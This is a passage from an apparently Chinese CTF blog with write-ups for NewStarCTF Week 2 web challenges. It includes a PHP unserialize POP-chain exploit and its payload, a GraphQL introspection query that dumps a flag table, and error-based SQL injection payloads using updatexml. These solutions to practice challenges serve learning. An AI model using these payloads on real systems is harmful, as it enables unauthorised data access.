class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">eeee</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pop&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;pop&#x27;</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这个题目是考反序列化，利用点为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><input checked=\"\" disabled=\"\" type=\"checkbox\"> __construct()，类的构造函数</li>\n<li>__destruct()，类的析构函数</li>\n<li>__call()，在对象中调用一个不可访问方法时调用</li>\n<li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li>\n<li>__get()，获得一个类的成员变量时调用</li>\n<li>__set()，设置一个类的成员变量时调用</li>\n<li>__isset()，当对不可访问属性调用isset()或empty()时调用</li>\n<li>__unset()，当对不可访问属性调用unset()时被调用。</li>\n<li>__sleep()，执行serialize()时，先会调用这个函数</li>\n<li>__wakeup()，执行unserialize()时，先会调用这个函数</li>\n<li>__toString()，类被当成字符串时的回应方法</li>\n<li>__invoke()，调用函数的方式调用一个对象时的回应方法</li>\n<li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li>\n<li>__clone()，当对象复制完成时调用</li>\n<li>__autoload()，尝试加载未定义的类</li>\n<li>__debugInfo()，打印所需调试信息</li>\n</ul>\n<p>这题目找pop链，一般我从**__destruct<strong>开始，链终点是Sec类中的</strong>__invoke**</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果我们将这里的name改成类，由于echo会将类当成字符串可以触发**__tostring**</p>\n<p>我们将Start类中的name设置为Sec类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于这里的check方法没有被定义则会触发**__call**</p>\n<p>我们将Sec中的obj设置为Easy类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们将Easy钟大哥cla设置为eeee类会触发**__clone**</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于eeee类中没有cm’d属性，这里调用会触发**__isset**</p>\n<p>我们将eeee中的obj设置为Start类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里的 <strong>($this-&gt;func)();<strong>可以出发</strong>__invoke</strong></p>\n<p>我们将Start中的func改为Sec类即可出发成功</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>pop链</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//error_reporting(0);</span></span><br><span class=\"line\"><span class=\"comment\">//highlight_file(__FILE__);</span></span><br><span class=\"line\"><span class=\"comment\">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Start</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;func=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Welcome to NewStarCTF, &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__isset</span>(<span class=\"params\"><span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        (<span class=\"variable language_\">$this</span>-&gt;func)();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sec</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$var</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj=<span class=\"keyword\">new</span> <span class=\"title class_\">Easy</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;obj-&gt;<span class=\"title function_ invoke__\">check</span>(<span class=\"variable\">$this</span>-&gt;<span class=\"keyword\">var</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;CTFers&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;/flag&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Easy</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$cla</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$fun</span>, <span class=\"variable\">$var</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cla = <span class=\"keyword\">clone</span> <span class=\"variable\">$var</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">eeee</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$obj</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__clone</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable language_\">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;success&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$c</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">eeee</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Start</span>();</span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;obj=<span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Sec</span>();</span><br><span class=\"line\"><span class=\"variable\">$b</span>-&gt;<span class=\"keyword\">var</span>=<span class=\"variable\">$c</span>;</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;name=<span class=\"variable\">$b</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$c</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?pop=O:<span class=\"number\">4</span>:<span class=\"string\">&quot;eeee&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">5</span>:<span class=\"string\">&quot;Start&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;name&quot;</span>;O:<span class=\"number\">3</span>:<span class=\"string\">&quot;Sec&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Easy&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;cla&quot;</span>;N;&#125;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;var&quot;</span>;r:<span class=\"number\">1</span>;&#125;s:<span class=\"number\">4</span>:<span class=\"string\">&quot;func&quot;</span>;O:<span class=\"number\">3</span>:<span class=\"string\">&quot;Sec&quot;</span>:<span class=\"number\">2</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;obj&quot;</span>;O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Easy&quot;</span>:<span class=\"number\">1</span>:&#123;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;cla&quot;</span>;N;&#125;s:<span class=\"number\">3</span>:<span class=\"string\">&quot;var&quot;</span>;N;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-ezAPI\"><a href=\"#4-ezAPI\" class=\"headerlink\" title=\"4.ezAPI\"></a>4.ezAPI</h2><p>进去后访问<a class=\"link\"   href=\"http://www.zip获取源码/\" >www.zip获取源码<i class=\"fas fa-external-link-alt\"></i></a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;body&gt;</span><br><span class=\"line\">        &lt;center&gt;</span><br><span class=\"line\">            &lt;h1&gt;Search Page&lt;/h1&gt;&lt;br&gt;</span><br><span class=\"line\">            &lt;hr&gt;&lt;br&gt;</span><br><span class=\"line\">            &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class=\"line\">            请输入用户ID: </span><br><span class=\"line\">            &lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Search&quot;&gt;</span><br><span class=\"line\">            &lt;/form&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$id = $_POST[&#x27;id&#x27;];</span><br><span class=\"line\">function waf($str)&#123;</span><br><span class=\"line\">    if(!is_numeric($str) || preg_replace(&quot;/[0-9]/&quot;,&quot;&quot;,$str) !== &quot;&quot;)&#123;#判断是否为数字字符串如果不是或者如果替换掉里的数字不为空就返回False,需要全部都不满足</span><br><span class=\"line\">        return False;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        return True;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function send($data)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $options = array(</span><br><span class=\"line\">        &#x27;http&#x27; =&gt; array(</span><br><span class=\"line\">            &#x27;method&#x27; =&gt; &#x27;POST&#x27;,</span><br><span class=\"line\">            &#x27;header&#x27; =&gt; &#x27;Content-type: application/json&#x27;,</span><br><span class=\"line\">            &#x27;content&#x27; =&gt; $data,</span><br><span class=\"line\">            &#x27;timeout&#x27; =&gt; 10 * 60</span><br><span class=\"line\">        )</span><br><span class=\"line\">    );</span><br><span class=\"line\">    $context = stream_context_create($options);</span><br><span class=\"line\">    $result = file_get_contents(&quot;http://graphql:8080/v1/graphql&quot;, false, $context);</span><br><span class=\"line\">    return $result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($id))&#123;</span><br><span class=\"line\">    if(waf($id))&#123;</span><br><span class=\"line\">        isset($_POST[&#x27;data&#x27;]) ? $data=$_POST[&#x27;data&#x27;] : $data=&#x27;&#123;&quot;query&quot;:&quot;query&#123;\\nusers_user_by_pk(id:&#x27;.$id.&#x27;) &#123;\\nname\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;&#x27;;</span><br><span class=\"line\">        $res = json_decode(send($data));</span><br><span class=\"line\">        if($res-&gt;data-&gt;users_user_by_pk-&gt;name !== NULL)&#123;</span><br><span class=\"line\">            echo &quot;ID: &quot;.$id.&quot;&lt;br&gt;Name: &quot;.$res-&gt;data-&gt;users_user_by_pk-&gt;name;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;&lt;b&gt;Can&#x27;t found it!&lt;/b&gt;&lt;br&gt;DEBUG: &quot;;</span><br><span class=\"line\">            var_dump($res-&gt;data);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;&lt;b&gt;Hacker!&lt;/b&gt;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    die(&quot;&lt;b&gt;No Data?&lt;/b&gt;&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;/center&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里给一篇graphQL的资料</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/wy_97/article/details/110522150\" >https://blog.csdn.net/wy_97/article/details/110522150<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>如果我们post了一个data，就不会执行后面的文件，我们查看graphQL的api后能完全控制语句</p>\n<p>用内省查询获取所以数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;\\n  __schema &#123;\\n  types &#123;\\n name  \\n &#125;\\n&#125;\\n&#125;\\n&quot;, &quot;variables&quot;:null&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161702655.png\"\n                        alt=\"图片-1665405825041\"\n                 ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&amp;data=&#123;&quot;query&quot;:&quot;query&#123;ffffllllaaagggg_1n_h3r3_flag &#123;flag&#125;&#125;&quot;,&quot;variables&quot;:null&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;4a902c8e-a8b5-ecfb-bee3-d6419865647c&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"人后的苦尚且还能克服 || 人前的尊严却无比脆弱","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"小黄dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"🐶✌️","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"NewStarCTF-WEEK2-WEB\"><a href=\"#NewStarCTF-WEEK2-WEB\" class=\"headerlink\" title=\"NewStarCTF WEEK2 WEB\"></a>NewStarCTF WEEK2 WEB</h1><h2 id=\"1-Word-For-You-2-Gen\"><a href=\"#1-Word-For-You-2-Gen\" class=\"headerlink\" title=\"1.Word-For-You(2 Gen)\"></a>1.Word-For-You(2 Gen)</h2><p>首先我们来试一下万能密码</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span><span class=\"string\">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701146.png\"\n                        alt=\"图片-1665405773483\"\n                 ></p>\n<p>发现没有什么用，我们尝试一下报错注入</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161701158.png\"\n                        alt=\"图片-1665405782381\"\n                 ></p>\n<p>这里爆出了库名~wfy，说明我们可以利用报错注入，接着我们爆列表</p>\n<p>这里一共爆了三个列表</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: <span class=\"string\">&#x27;~wfy_admin,wfy_comments,wfy_info&#x27;</span>    </span><br></pre></td></tr></table></figure>\n\n<p>这里我们都试了一遍，发现flag在wfy_comments里面，我们查一下里面</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>’<span class=\"operator\">||</span>updatexml(<span class=\"number\">1</span>,concat(<span class=\"number\">0x7e</span>,(<span class=\"keyword\">select</span> reverse(group_concat(text)) <span class=\"keyword\">from</span> wfy_comments)),<span class=\"number\">1</span>)#</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XPATH syntax error: <span class=\"string\">&#x27;~&#125;sr0rre_emos_ek2m_t4uJ&#123;galf,难&#x27;</span>    <span class=\"operator\">/</span><span class=\"operator\">/</span>得到逆序flag</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"2-IncludeOne\"><a href=\"#2-IncludeOne\" class=\"headerlink\" title=\"2.IncludeOne\"></a>2.IncludeOne</h2><p>题目源代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 